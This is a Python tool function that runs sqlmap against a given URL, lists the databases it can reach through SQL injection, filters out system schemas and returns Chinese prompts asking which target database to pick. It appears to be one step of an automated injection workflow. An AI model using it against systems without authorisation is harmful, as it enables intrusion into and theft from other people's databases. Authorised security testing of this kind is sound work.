import re
import subprocess
from config import SQLMAP_PATH
from tools.is_not_injectable import _is_not_injectable


def run_sqlmap_get_DB(url: str) -> str:
    if 'http' not in url.lower():
        return "URL格式错误，请以 http:// 或 https:// 开头"

    cmd = [
        "python", SQLMAP_PATH,
        "-u", url,
        "--dbs",
        "--batch",
        "--timeout", "10",
        "-v", "0"
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        if result.returncode != 0:
            return f"SQLMap 失败 (返回码 {result.returncode}):\n{result.stderr.strip()[:500]}"
        output = result.stdout.strip()
        if not output or _is_not_injectable(output):
            return f"未检测到注入点，输出:\n{output[:500]}"

        if "available databases" in output:
            dbs = re.findall(r'\[\*\]\s+(\S+)', output)
            if dbs:
                filtered = [db for db in dbs if db not in
                            ('information_schema', 'starting','ending','mysql', 'performance_schema', 'sys')]
                if not filtered:
                    filtered = dbs
                return f"发现数据库: {', '.join(filtered)}。请选择目标数据库。"
            else:
                return "未找到数据库列表。"
        else:
            return f"未发现数据库列表。输出片段:\n{output[:500]}"
    except subprocess.TimeoutExpired:
        return "SQLMap 扫描超时 (超过120秒)"
    except Exception as e:
        return f"执行错误: {str(e)}"